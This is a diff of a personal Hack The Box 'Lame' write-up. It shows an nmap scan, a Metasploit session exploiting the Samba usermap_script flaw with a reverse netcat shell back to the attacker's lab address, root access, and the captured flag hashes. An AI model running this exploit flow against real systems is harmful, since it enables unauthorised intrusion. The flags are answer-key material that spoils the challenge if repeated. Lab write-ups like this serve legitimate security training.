@@ -7,7 +7,7 @@ date: "2024-08-04"
 
 ### Port Scan
 
-```
+```shell
 Nmap 7.94SVN scan initiated Sat Aug 10 08:35:19 2024 as: nmap -sC -sV -A -T4 -Pn -o scan 10.10.10.3
 Nmap scan report for 10.10.10.3
 Host is up (0.15s latency).
@@ -43,29 +43,9 @@ Anonymous connection FTP but nothing there
 Looking online i found this vulnerability for this version of smb
 
 
-```text
+```shell
 ┌──(kali㉿kali)-[~/HTB/Lame]
 └─$ msfconsole                                                                      
-Metasploit tip: Use the resource command to run commands from a file
-                                                  
-     ,           ,
-    /             \                                                                                                                 
-   ((__---,,,---__))                                                                                                                
-      (_) O O (_)_________                                                                                                          
-         \ _ /            |\                                                                                                        
-          o_o \   M S F   | \                                                                                                       
-               \   _____  |  *                                                                                                      
-                |||   WW|||                                                                                                         
-                |||     |||                                                                                                         
-                                                                                                                                    
-
-       =[ metasploit v6.4.18-dev                          ]
-+ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]
-+ -- --=[ 1465 payloads - 47 encoders - 11 nops           ]
-+ -- --=[ 9 evasion                                       ]
-
-Metasploit Documentation: https://docs.metasploit.com/
-
 msf6 > search smb 3.0.20
 [-] No results from search
 msf6 > smb 3.0.20
@@ -73,8 +53,7 @@ msf6 > smb 3.0.20
 msf6 > search samba 3.0                                                                                                                                          
                                                                                                                                                                  
 Matching Modules                                                                                                                                                 
-================                                                                                                                                                 
-                                                                                                                                                                 
+================                                                                                                                                                                                                                                                                                                 
    #   Name                                                   Disclosure Date  Rank       Check  Description                                                     
    -   ----                                                   ---------------  ----       -----  -----------
    0   exploit/multi/samba/usermap_script                     2007-05-14       excellent  No     Samba "username map script" Command Execution
@@ -101,16 +80,12 @@ Matching Modules
    21    \_ target: Solaris 8/9/10 SPARC Samba 3.0.21-3.0.24  .                .          .      .
    22    \_ target: DEBUG                                     .                .          .      .
 
-
 Interact with a module by name or index. For example info 22, use 22 or use exploit/solaris/samba/lsa_transnames_heap
 After interacting with a module you can manually set a TARGET with set TARGET 'DEBUG'
-
 msf6 > use exploit/multi/samba/usermap_script 
 [*] No payload configured, defaulting to cmd/unix/reverse_netcat
 msf6 exploit(multi/samba/usermap_script) > show options
-
 Module options (exploit/multi/samba/usermap_script):
-
    Name     Current Setting  Required  Description
    ----     ---------------  --------  -----------
    CHOST                     no        The local client address
@@ -118,8 +93,6 @@ Module options (exploit/multi/samba/usermap_script):
    Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
    RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
    RPORT    139              yes       The target port (TCP)
-
-
 Payload options (cmd/unix/reverse_netcat):
 
    Name   Current Setting  Required  Description
@@ -133,55 +106,22 @@ Exploit target:
    Id  Name
    --  ----
    0   Automatic
-
-
-
-View the full module info with the info, or info -d command.
-
 msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.14.185
 LHOST => 10.10.14.185
 msf6 exploit(multi/samba/usermap_script) > set LPORT 9091
 LPORT => 9091
 msf6 exploit(multi/samba/usermap_script) > exploit
-
 [-] Msf::OptionValidateError One or more options failed to validate: RHOSTS.
 msf6 exploit(multi/samba/usermap_script) > set RHOST 10.10.10.3
 RHOST => 10.10.10.3
 msf6 exploit(multi/samba/usermap_script) > set RPORT 139
 RPORT => 139
 msf6 exploit(multi/samba/usermap_script) > exploit
-
 [*] Started reverse TCP handler on 10.10.14.185:9091 
 [*] Command shell session 1 opened (10.10.14.185:9091 -> 10.10.10.3:47888) at 2024-08-10 09:35:50 -0400
 
 whoami
 root
-ls
-bin
-boot
-cdrom
-dev
-etc
-home
-initrd
-initrd.img
-initrd.img.old
-lib
-lost+found
-media
-mnt
-nohup.out
-opt
-proc
-root
-sbin
-srv
-sys
-tmp
-usr
-var
-vmlinuz
-vmlinuz.old
 cd /root
 ls
 Desktop
@@ -192,13 +132,11 @@ cat root.txt
 6118f8816315bd33ecac622d179c65af
 ```
 
-
 ![](attachment/95e2ca9714b079079c673225e5a17f15.png)![](attachment/e0218db999901f943bf934f889d0edec.png)
 
 ### Flags
 
 ```
-
 root:6118f8816315bd33ecac622d179c65af
 user:15fd56e82fdefb166bfb1631b6c6360a
 
